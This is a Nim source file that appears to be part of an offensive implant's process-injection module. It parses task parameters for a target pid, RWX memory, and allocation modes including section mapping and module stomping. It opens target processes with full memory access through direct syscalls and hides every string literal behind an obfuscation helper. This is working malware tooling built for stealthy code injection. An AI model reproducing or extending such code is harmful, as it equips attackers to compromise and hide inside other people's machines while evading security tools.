from std/base64 import decode
import std/json
from std/strutils import endsWith, parseInt, strip, toLowerAscii
import ../../utils/global
import ../../utils/winapi/syscall

proc decodePayload*(input: string): seq[byte] =
  # Decodes a base 64 payload into raw bytes
  if input.len == 0:
    return @[]
  let raw = decode(input)
  result = newSeq[byte](raw.len)
  if raw.len > 0: copyMem(addr result[0], unsafeAddr raw[0], raw.len)

proc paramPid*(params: string): uint32 =
  # Reads the pid value from the json params
  try:
    let p = parseJson(params)
    if not p.hasKey(obf("pid")):
      return 0
    let n = p[obf("pid")]
    if n.kind == JsonNodeKind.JInt:
      result = uint32(n.getInt())
    else:
      result = uint32(parseInt(n.getStr()))
  except JsonParsingError:
    result = 0

proc paramRwx*(params: string): bool =
  # Reads the rwx flag from the json params
  try:
    let p = parseJson(params)
    if not p.hasKey(obf("rwx")):
      return false
    let n = p[obf("rwx")]
    case n.kind
    of JsonNodeKind.JBool:
      result = n.getBool()
    of JsonNodeKind.JInt:
      result = n.getInt() != 0
    of JsonNodeKind.JString:
      let s = n.getStr().strip().toLowerAscii()
      result = s == obf("1") or s == obf("true") or s == obf("yes") or s == obf("on")
    else:
      result = true
  except JsonParsingError:
    result = false

proc paramAllocMode*(params: string): string =
  # Reads the alloc mode from the json params
  try:
    let p = parseJson(params)
    if not p.hasKey(obf("alloc")):
      return obf("vanilla")
    let v = p[obf("alloc")].getStr().strip().toLowerAscii()
    if v.len == 0 or v == obf("vanilla"):
      result = obf("vanilla")
    elif v == obf("section") or v == obf("stomp"):
      result = v
    else:
      result = ""
  except JsonParsingError:
    result = obf("vanilla")

proc paramAllocSection*(params: string): bool =
  # Checks that the alloc mode is section
  paramAllocMode(params) == obf("section")

proc stompDllBaseName*(raw: string): string =
  # Returns the dll file name used for module stomp
  var s = raw.strip().toLowerAscii()
  if s.len >= 2 and s[0] == '"' and s[s.high] == '"':
    s = s[1 .. ^2].strip()
  var sep = -1
  for i in countdown(s.len - 1, 0):
    if s[i] == '/' or s[i] == '\\':
      sep = i
      break
  if sep >= 0:
    s = s[sep + 1 .. ^1].strip()
  if s.len == 0:
    return ""
  if not s.endsWith(obf(".dll")):
    s &= obf(".dll")
  s

proc paramStompDll*(params: string): string =
  # Reads the stomp dll name from the json params
  try:
    let p = parseJson(params)
    if not p.hasKey(obf("stomp_dll")):
      return ""
    result = stompDllBaseName(p[obf("stomp_dll")].getStr())
  except JsonParsingError:
    result = ""

var lastOpenProcessStatus*: culong = 0

proc openTargetPid*(pid: uint32): pointer =
  # Opens a process handle for the target pid
  if pid == 0:
    lastOpenProcessStatus = 0
    return nil
  result = openProcess(culong(pid), processVmAll, addr lastOpenProcessStatus)

var lastStompErr*: string

proc clearStompErr*() =
  # Clears the last stomp error message
  lastStompErr = ""

proc takeStompErr*(): string =
  # Returns the last stomp error and clears it
  let msg = lastStompErr
  lastStompErr = ""
  msg

proc stompFail*(msg: string): pointer =
  # Stores the stomp error and returns nil
  lastStompErr = msg
  nil
